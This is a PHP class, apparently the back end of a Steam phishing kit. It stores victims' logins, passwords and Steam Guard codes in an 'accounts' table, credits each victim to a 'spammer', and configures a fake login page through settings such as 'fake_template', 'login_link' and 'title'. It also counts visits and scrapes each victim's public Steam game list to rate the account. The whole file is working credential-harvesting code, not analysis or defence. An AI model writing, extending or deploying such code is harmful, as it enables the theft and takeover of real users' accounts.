<?php
require_once("classDB.php");
require_once("simple_html_dom.php");

	class classFake {
		private $db;
		
		public function __construct(){
			$this->db = new DB();
		}
		
		public function b_CheckAccount($login, $pass){
			$res = $this->db->countRows(
				"accounts", 
				array(
					array("login", "=", $login),
					array("password", "=", $pass)
				)
			);
			return ($res > 0);
		}
		
		public function b_CheckLogin($login){
			$res = $this->db->countRows(
				"accounts", 
				array(
					array("login", "=", $login)
				)
			);
			return ($res > 0);
		}
		
		public function void_SetPassword($login, $password){
			$this->db->updateRow(
				"accounts", 
				array (
					array("login", "=", $login)
				),
				array (
					array("password", "=", $password)
				)
			);
		}
		
		public function void_SetGuard($login, $guard){
			$this->db->updateRow(
				"accounts", 
				array (
					array("login", "=", $login)
				),
				array (
					array("guard", "=", $guard)
				)
			);
		}
		
		public function void_SetTime($login){
			$this->db->updateRow(
				"accounts", 
				array (
					array("login", "=", $login)
				),
				array (
					array("time", "=", time())
				)
			);
		}
		
		public function void_AddAccount($login, $pass, $guard, $steamid, $spammer){
			if (self::b_CheckLogin($login)) {
				// self::void_SetPassword($login, $pass);
				self::void_SetGuard($login, $guard);
				// self::void_SetTime($login);
			}
			else {
				$this->db->addRow(
					"accounts", 
					array
					(
						array("login", "=", $login),
						array("password", "=", $pass),
						array("guard", "=", $guard),
						array("steamid", "=", $steamid),
						array("time", "=", time()),
						array("status", "=", 0),
						array("spammer", "=", $spammer),
						array("games", "=", self::s_parseGames("https://steamcommunity.com/profiles/" . $steamid)),
						array("isnotificated", "=", 0)
					)
				);
			}
		}
		
		public function b_GetValidateActivity(){
			$rows = $this->db->getRows(
				"settings", 
				array (
					array("name", "=", "validate_activity")
				)
			);
			return ($rows[0]["value"] == 1);
		}
		
		function int_GetFakeTemplate(){
			$rows = $this->db->getRows(
				"settings", 
				array (
					array("name", "=", "fake_template")
				)
			);
			return $rows[0]["value"];
		}
		
		function int_GetWndType(){
			$rows = $this->db->getRows(
				"settings", 
				array (
					array("name", "=", "wnd_type")
				)
			);
			return $rows[0]["value"];
		}
		
		function s_GetFakeTitle(){
			$rows = $this->db->getRows(
				"settings", 
				array (
					array("name", "=", "title")
				)
			);
			return $rows[0]["value"];
		}
		
		function s_GetLoginLink(){
			$rows = $this->db->getRows(
				"settings", 
				array (
					array("name", "=", "login_link")
				)
			);
			return $rows[0]["value"];
		}
		
		function void_IncrementVisits(){
			$rows = $this->db->getRows(
				"settings", 
				array (
					array("name", "=", "visits")
				)
			);
			$visits = $rows[0]["value"];
			
			$this->db->updateRow(
				"settings", 
				array (
					array("name", "=", "visits")
				),
				array (
					array("value", "=", $visits + 1)
				)
			);
		}
		
		function s_parseGames($profile_link) {
			if ($profile_link == "https://steamcommunity.com/profiles/") return "";
			
			$profile = file_get_contents($profile_link . "/games/?tab=all");
			
			if ($profile == false) return "";
			
			$html = str_get_html($profile);
			$private = $html->find("div[class=profile_private_info]", 0)->innertext;
			
			if (strpos($private, "This profile is private.") === false) {
				$js = $html->find("script[language=javascript]", 0)->innertext;
				$js = ltrim($js);
				
				$symbol_pos = strpos($js, ";");
				$js = substr($js, 0, $symbol_pos);
				
				$encoded_games = str_replace("var rgGames = ", "", $js);
				$decoded_games = json_decode($encoded_games, true);
				
				$all_games = [];
				foreach($decoded_games as $key => $game) {
					$all_games[] = $game["name"];
				}
				
				return json_encode($all_games);
			}
			else return "";
		}
		
		function int_GetTimerActivity(){
			$rows = $this->db->getRows(
				"settings", 
				array (
					array("name", "=", "timer_activity")
				)
			);
			return $rows[0]["value"];
		}
		
		function int_GetTimerTime(){
			$rows = $this->db->getRows(
				"settings", 
				array (
					array("name", "=", "timer_date")
				)
			);
			return strtotime($rows[0]["value"]);
		}
			
		function s_GetPassPrefix(){
			$rows = $this->db->getRows(
				"settings", 
				array (
					array("name", "=", "pass_prefix")
				)
			);
			return $rows[0]["value"];
		}

		}
?>